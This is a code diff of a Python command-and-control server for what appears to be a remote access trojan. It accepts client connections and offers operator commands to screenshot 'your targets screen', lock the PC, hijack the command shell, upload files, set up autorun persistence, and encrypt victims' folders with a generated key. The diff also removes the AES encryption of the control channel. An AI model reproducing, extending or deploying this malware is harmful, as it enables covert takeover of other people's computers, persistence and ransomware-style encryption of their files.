@@ -7,8 +7,6 @@ import threading
 import time
 import tqdm
 from queue import Queue
-from Crypto.Cipher import AES
-from Crypto import Random
 import keys
 
 threads = 2
@@ -17,13 +15,12 @@ queue = Queue()
 arrAdresses = []
 arrConnections = []
 
-hash_key = keys.hash_key
 strHost = keys.host
 intPort = keys.port
 
 intBuff = 1024
 
-strName = ("""\
+strName = ("""
 
     ___        _                 _                     
    /   \ ___  | | _ __ ___    __| |  ___    ___   _ __ 
@@ -39,19 +36,9 @@ print(strName)
 decode_utf = lambda data: data.decode("utf-8")
 remove_quotes = lambda string: string.replace("\"", "")
 center = lambda string, title: f"{{:^{len(string)}}}".format(title)
+send = lambda data: connection.send(data)
+recv = lambda buffer: connection.recv(buffer)
 
-# TODO: where to save iv?
-def send(data):
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(hash_key, AES.MODE_CBC, iv)
-    connection.send(cipher.encrypt(iv + data))
-
-
-def recv(buffer):
-    enc = connection.recv(buffer)
-    iv = enc[:AES.block_size]
-    cipher = AES.new(hash_key, AES.MODE_CBC, iv)
-    return cipher.decrypt(enc[AES.block_size:])
 
 def receiveAll(buffer):
     byteData = b""
@@ -90,7 +77,7 @@ def accept_socket():
             connection, address = objSocket.accept()
             connection.setblocking(1)  # timeout verhindern
             arrConnections.append(connection)
-            client_info = decode_utf(recv(intBuff)).split("',")
+            client_info = decode_utf(connection.recv(intBuff)).split("',")
             address += client_info[0], client_info[1], client_info[0]
             arrAdresses.append(address)
             print("\n" + "Connection has been established : {0} ({1})".format(address[0], address[2]))
@@ -268,38 +255,39 @@ def send_commands():
     while True:
         strChoice = input("\n" + "Type Selection: ")
 
-        if strChoice[:3] == "--m" and len(strChoice) > 3:
+        if strChoice[:3] == "-m" and len(strChoice) > 3:
             message = "msg" + strChoice[4:]
             send(str.encode(message))
-        elif strChoice[:3] == "--w" and len(strChoice) > 3:
+        elif strChoice[:3] == "-w" and len(strChoice) > 3:
             site = "site" + strChoice[4:]
             send(str.encode(site))
-        elif strChoice[:3] == "--p":
+        elif strChoice[:3] == "-p":
             screenshot()
-        elif strChoice[:3] == "--l":
+        elif strChoice[:3] == "-l":
             send(str.encode("lock"))
-        elif strChoice[:3] == "--c":
+        elif strChoice[:3] == "-c":
             command_shell()
-        elif strChoice[:3] == "--f" and len(strChoice) > 3:
+        elif strChoice[:3] == "-f" and len(strChoice) > 3:
             uploadFile(strChoice[4:])
-        elif strChoice[:3] == "--a":
+        elif strChoice[:3] == "-a":
             autorun()
-        elif strChoice[:5] == "--enc" and len(strChoice) > 5:
+        elif strChoice[:5] == "-enc" and len(strChoice) > 5:
             encrypt_data(strChoice[6:])
-        elif strChoice[:5] == "--dec" and len(strChoice) > 5:
+        elif strChoice[:5] == "-dec" and len(strChoice) > 5:
             decrypt_data(strChoice[6:])
         elif strChoice[:4] == "exit":
             return;
         elif strChoice == "--help":
             strHelp = "Commands: " + \
-                      "\n" + "--m" + 4 * " " + "->" + 4 * " " + "Write Messages with Pop-Up (--m Hello World)" + \
-                      "\n" + "--w" + 4 * " " + "->" + 4 * " " + "Open website (--w www.google.com)" + \
-                      "\n" + "--p" + 4 * " " + "->" + 4 * " " + "Make Screenshot from your targets screen (--p)" + \
-                      "\n" + "--l" + 4 * " " + "->" + 4 * " " + "Lock the PC (--l)" + \
-                      "\n" + "--c" + 4 * " " + "->" + 4 * " " + "Hijack the command shell (--c)" + \
-                      "\n" + "--f" + 4 * " " + "->" + 4 * " " + "Upload File (--f Filename)" + \
-                      "\n" + "--enc" + 2 * " " + "->" + 2 * " " + "Encrypt Folder with generated key in encrypt_key.txt (--enc path)" + \
-                      "\n" + "--dec" + 2 * " " + "->" + 2 * " " + "Decrypt Folder with safed key in encrypt_key.txt  (--dec path)" + \
+                      "\n" + "-m" + 4 * " " + "->" + 4 * " " + "Write Messages with Pop-Up (--m Hello World)" + \
+                      "\n" + "-a" + 4 * " " + "->" + 4 * " " + "Setup autorun" + \
+                      "\n" + "-w" + 4 * " " + "->" + 4 * " " + "Open website (--w www.google.com)" + \
+                      "\n" + "-p" + 4 * " " + "->" + 4 * " " + "Make Screenshot from your targets screen (--p)" + \
+                      "\n" + "-l" + 4 * " " + "->" + 4 * " " + "Lock the PC (--l)" + \
+                      "\n" + "-c" + 4 * " " + "->" + 4 * " " + "Hijack the command shell (--c)" + \
+                      "\n" + "-f" + 4 * " " + "->" + 4 * " " + "Upload File (--f Filename)" + \
+                      "\n" + "-enc" + 2 * " " + "->" + 2 * " " + "Encrypt Folder with generated key in encrypt_key.txt (--enc path)" + \
+                      "\n" + "-dec" + 2 * " " + "->" + 2 * " " + "Decrypt Folder with safed key in encrypt_key.txt  (--dec path)" + \
                       "\n" + "exit" + 3 * " " + "->" + 4 * " " + "Exit the Command Line and go to the main menu (exit)"
             print(strHelp)
         else:
